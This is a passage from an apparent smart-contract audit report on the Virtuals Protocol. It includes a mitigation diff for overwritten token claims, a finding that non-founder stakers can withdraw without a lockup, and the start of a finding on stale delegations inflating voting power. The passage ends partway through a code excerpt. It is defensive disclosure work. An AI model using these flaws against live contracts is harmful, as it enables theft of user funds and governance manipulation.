<h3 style="position:relative;" id="recommended-mitigation-steps-22"><a class="anchor before" aria-label="recommended mitigation steps 22 permalink" href="#recommended-mitigation-steps-22"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To resolve the issue, update the logic to <strong>add</strong> the new <code>agentTokens</code> amount instead of <strong>overwriting</strong> it.</p>
<pre data-index="101" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function onGenesisSuccess(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address[] calldata refundVirtualsTokenUserAddresses,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256[] calldata refundVirtualsTokenUserAmounts,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address[] calldata distributeAgentTokenUserAddresses,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256[] calldata distributeAgentTokenUserAmounts,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address creator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) external onlyRole(FACTORY_ROLE) nonReentrant whenNotCancelled whenNotFailed whenEnded returns (address) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(refundUserCountForFailed == 0, "OnGenesisFailed already called");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            refundVirtualsTokenUserAddresses.length == refundVirtualsTokenUserAmounts.length,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            "Mismatched refund arrays"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            distributeAgentTokenUserAddresses.length == distributeAgentTokenUserAmounts.length,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            "Mismatched distribution arrays"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Calculate total refund amount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 totalRefundAmount = 0;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        for (uint256 i = 0; i &lt; refundVirtualsTokenUserAmounts.length; i++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // check if the user has enough virtuals committed</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] &gt;= refundVirtualsTokenUserAmounts[i],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                "Insufficient Virtual Token committed"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            totalRefundAmount += refundVirtualsTokenUserAmounts[i];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Check if launch has been called before</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        bool isFirstLaunch = agentTokenAddress == address(0);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Calculate required balance based on whether this is first launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 requiredVirtualsBalance = isFirstLaunch ? totalRefundAmount + reserveAmount : totalRefundAmount;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Check if contract has enough virtuals balance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            IERC20(virtualTokenAddress).balanceOf(address(this)) &gt;= requiredVirtualsBalance,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            "Insufficient Virtual Token balance"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Only do launch related operations if this is first launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        if (isFirstLaunch) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // grant allowance to agentFactoryAddress for launch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            IERC20(virtualTokenAddress).approve(agentFactoryAddress, reserveAmount);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // Call initFromBondingCurve and executeBondingCurveApplication</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            uint256 id = IAgentFactoryV3(agentFactoryAddress).initFromBondingCurve(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                string.concat(genesisName, " by Virtuals"),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                genesisTicker,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                genesisCores,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                tbaSalt,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                tbaImplementation,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                daoVotingPeriod,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                daoThreshold,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                reserveAmount,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                creator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            address agentToken = IAgentFactoryV3(agentFactoryAddress).executeBondingCurveApplication(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                id,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                agentTokenTotalSupply,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                agentTokenLpSupply,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                address(this) // vault</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            require(agentToken != address(0), "Agent token creation failed");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // Store the created agent token address</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            agentTokenAddress = agentToken;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Calculate total distribution amount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 totalDistributionAmount = 0;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        for (uint256 i = 0; i &lt; distributeAgentTokenUserAmounts.length; i++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            totalDistributionAmount += distributeAgentTokenUserAmounts[i];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Check if contract has enough agent token balance only after agentTokenAddress be set</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            IERC20(agentTokenAddress).balanceOf(address(this)) &gt;= totalDistributionAmount,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            "Insufficient Agent Token balance"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Directly transfer Virtual Token refunds</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        for (uint256 i = 0; i &lt; refundVirtualsTokenUserAddresses.length; i++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // first decrease the virtuals mapping of the user to prevent reentrancy attacks</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] -= refundVirtualsTokenUserAmounts[i];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            // then transfer the virtuals</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            IERC20(virtualTokenAddress).safeTransfer(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                refundVirtualsTokenUserAddresses[i],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                refundVirtualsTokenUserAmounts[i]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            emit RefundClaimed(genesisId, refundVirtualsTokenUserAddresses[i], refundVirtualsTokenUserAmounts[i]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // save the amount of agent tokens to claim</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        for (uint256 i = 0; i &lt; distributeAgentTokenUserAddresses.length; i++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] = distributeAgentTokenUserAmounts[i];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] += distributeAgentTokenUserAmounts[i]; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        emit GenesisSucceeded(genesisId);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        return agentTokenAddress;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals"><a class="anchor before" aria-label="m 19 lack of maturity check for non founder users allowing immediate withdrawals permalink" href="#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-128">[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-700">Pelz</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-847">aiota</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-393">gregom</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-149">Ishenxx</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-6"><a class="anchor before" aria-label="finding description and impact 6 permalink" href="#finding-description-and-impact-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the <code>AgentVeToken::withdraw()</code> function, the contract contains a check for the maturity of stakes, but this check only applies to the founding staker (<code>founder</code>). The condition is:</p>
<pre data-index="102" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> ((</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">founder</span><span class="mtk1">) &amp;&amp; ((</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) - </span><span class="mtk12">amount</span><span class="mtk1">) &lt; </span><span class="mtk12">initialLock</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &gt;= </span><span class="mtk12">matureAt</span><span class="mtk1">, </span><span class="mtk8">"Not mature yet"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This ensures that the founding staker must wait for a lockup period before withdrawing if their balance falls below <code>initialLock</code>.</p>
<p>However, there is no such lockup or maturity check for non-founder users. If <code>canStake</code> is enabled for all users, any user who stakes tokens can withdraw immediately, bypassing any intended lockup or maturity period. This flaw effectively removes any staking or lockup incentive for users who stake their tokens, as they can withdraw at will without any restriction.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-23"><a class="anchor before" aria-label="recommended mitigation steps 23 permalink" href="#recommended-mitigation-steps-23"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To address this issue, a maturity check should be applied to all users who stake tokens. This would ensure that all users are subject to the same withdrawal restrictions, and their stakes are locked for a specified period before they can withdraw. Recommended approach:</p>
<p><strong>Implement the lockup for non-founder users:</strong> Ensure that all users, not just the founder, are locked in for a set period before being allowed to withdraw. You could add logic to set a different lockup period for different classes of users if needed.</p>
<hr>
<h2 style="position:relative;" id="m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity"><a class="anchor before" aria-label="m 20 delegation not revoked on withdrawal allows reward and voting power inflation post maturity permalink" href="#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-129">[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-456">yaractf</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-148">Ishenxx</a> and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-399">nnamdi0482</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-7"><a class="anchor before" aria-label="finding description and impact 7 permalink" href="#finding-description-and-impact-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>Stakers delegate their voting power using the <code>stake()</code> function, which internally calls <code>_delegate(receiver, delegatee)</code> and records the delegatee via checkpointing at the current <code>clock()</code> (block number). Upon maturity (<code>matureAt</code>), the <code>withdraw()</code> function allows full withdrawal of tokens, including by the stakers.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80</a></p>
<pre data-index="103" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">stake</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">canStake</span><span class="mtk1"> || </span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Staking is disabled for private agent"</span><span class="mtk1">); </span><span class="mtk3">// Either public or first staker</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Cannot stake 0"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient asset token balance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">allowance</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient asset token allowance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAgentNft</span><span class="mtk1"> </span><span class="mtk12">registry</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">agentNft</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">stakingTokenToVirtualId</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(!</span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">isBlacklisted</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">), </span><span class="mtk8">"Agent Blacklisted"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">initialLock</span><span class="mtk1"> = </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">addValidator</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;      </span><span class="mtk11">_delegate</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_balanceCheckpoints</span><span class="mtk1">[</span><span class="mtk12">receiver</span><span class="mtk1">].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk11">clock</span><span class="mtk1">(), </span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint208</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">)));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, the <code>withdraw()</code> function does not call <code>_delegate(sender, address(0))</code> to clean up delegations when a user fully withdraws their stake. This leaves the previous delegation entry active, even though the staker now has zero voting power.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95</a></p>
<pre data-index="104" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">withdraw</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient balance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> ((</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">founder</span><span class="mtk1">) &amp;&amp; ((</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) - </span><span class="mtk12">amount</span><span class="mtk1">) &lt; </span><span class="mtk12">initialLock</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &gt;= </span><span class="mtk12">matureAt</span><span class="mtk1">, </span><span class="mtk8">"Not mature yet"</span><span class="mtk1">);</span></span></span>
